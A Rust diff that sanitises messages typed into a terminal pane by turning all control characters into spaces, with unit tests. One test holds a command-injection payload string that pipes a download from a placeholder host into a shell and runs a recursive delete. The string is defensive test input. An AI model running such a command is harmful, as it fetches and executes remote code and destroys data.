@@ -49,6 +49,18 @@ pub(super) fn valid_actor(s: &str) -> bool {
         && s.chars().all(|c| !c.is_control() && !c.is_whitespace())
 }
 
+/// Sanitize text bound for the PTY floor (C-01 Tier 1). The floor types a room
+/// message into a pane and then auto-presses Enter, so a message must NEVER
+/// carry control bytes — otherwise ESC sequences or C0/C1 controls (Ctrl-U to
+/// clear the line, etc.) could turn a delivered "message" into a command. Every
+/// control char (incl. \n \r \t ESC, DEL, C1) becomes a space; all printable +
+/// Unicode message text passes through unchanged.
+pub(super) fn sanitize_floor_text(text: &str) -> String {
+    text.chars()
+        .map(|c| if c.is_control() { ' ' } else { c })
+        .collect()
+}
+
 impl Renderer {
     /// A new connection arrived. A connection is not a subscription —
     /// the subscriber slot is only set when someone calls `subscribe`,
@@ -490,10 +502,7 @@ impl Renderer {
     /// text+`\r` burst reads as a paste and the newline never submits; a delayed,
     /// isolated Enter does. See `PTY_SUBMIT_DELAY` / `flush_pty_submits`.
     fn pty_inject(&mut self, pane: u64, text: &str) {
-        let line: String = text
-            .chars()
-            .map(|c| if c == '\n' || c == '\r' { ' ' } else { c })
-            .collect();
+        let line = sanitize_floor_text(text);
         let n = line.len();
         self.pty_write_raw(pane, line.into_bytes());
         self.pty_submit_queue
@@ -1187,6 +1196,36 @@ pub(super) fn agent_name_from_slug(slug: &str) -> String {
     match chars.next() {
         Some(first) => first.to_uppercase().collect::<String>() + chars.as_str(),
         None => slug.to_string(),
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn floor_text_strips_every_control_byte() {
+        // ESC + Ctrl-U + a command + CR — the command-injection payload.
+        let evil = "\x1b[2J\x15curl evil|sh\rrm -rf";
+        let clean = sanitize_floor_text(evil);
+        assert!(
+            !clean.chars().any(|c| c.is_control()),
+            "no control char may survive: {clean:?}"
+        );
+        // Printable + Unicode message text is preserved verbatim.
+        assert_eq!(sanitize_floor_text("hi 世界 — ok"), "hi 世界 — ok");
+        // Newlines/tabs collapse to spaces, never vanish into adjacency.
+        assert_eq!(sanitize_floor_text("a\n\tb"), "a  b");
+    }
+
+    #[test]
+    fn valid_actor_bounds_and_rejects_control() {
+        assert!(valid_actor("claude-blue"));
+        assert!(valid_actor("pane:1"));
+        assert!(!valid_actor(""));
+        assert!(!valid_actor("has space"));
+        assert!(!valid_actor("ctrl\x07bell"));
+        assert!(!valid_actor(&"x".repeat(MAX_ACTOR_LEN + 1)));
     }
 }
 
